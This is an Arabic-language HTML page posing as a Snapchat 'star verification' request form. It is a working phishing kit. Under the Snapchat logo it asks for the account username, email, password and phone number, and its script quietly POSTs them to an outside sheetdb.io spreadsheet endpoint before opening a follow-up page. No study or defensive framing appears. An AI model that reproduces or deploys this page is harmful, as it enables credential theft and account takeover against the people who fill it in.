<!DOCTYPE html>
<html dir="rtl">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel ="icon" href="stylesheet/snap1.png">
    <title>ارسال طلب توثيق</title>
    <link  href="index.css"  rel="stylesheet">
    <link  href="page2.html" >
</head>
<body>
    <form action="https://sheetdb.io/api/v1/kcaxngxfw4gkj" method="post" id="sheetdb-form"  >
      <div class="container">
		
        
          <img src="https://www.snapchat.com/static/style-guide/images/ghost/ghost.svg" width="50" height="50">
          <h3>تقديم طلب التحقّق من نجم سناب</h3>
          <br> <br>
          <input type="text" id="Username" placeholder="اسم مستخدم سناب شات (بدون مسافات)،" name="data[Username]" required>
          <br><br>

          <input type="email" id="email" placeholder="البريد الإلكتروني المُرتبط بحسابك على سناب شات" name="data[email]" required>
          <br> <br>
          <input type="password" id="psw" placeholder="كلمة المرور المُرتبطة بحسابك على سناب شات" name="data[psw]" required>
          <br> <br>
          <input type="text" id="phone number" placeholder="رقم الهاتف المُرتبط بحسابك على سناب شات" name="data[phone number]" required>
          <br> 
          <button href="page2.html" type="submit" class="btn">ارسال الطلب</button>
          
      



        <script>
            var form = document.getElementById('sheetdb-form');
        form.addEventListener("submit", e => {
          e.preventDefault();
          fetch(form.action, {
              method : "POST",
              body: new FormData(document.getElementById("sheetdb-form")),
          }).then(
              response => response.json()
          ).then((html) => {
            // you can put any JS code here
            window.open('page2.html', '_blank');

          });
        });
        </script>
        


</body>
</html>
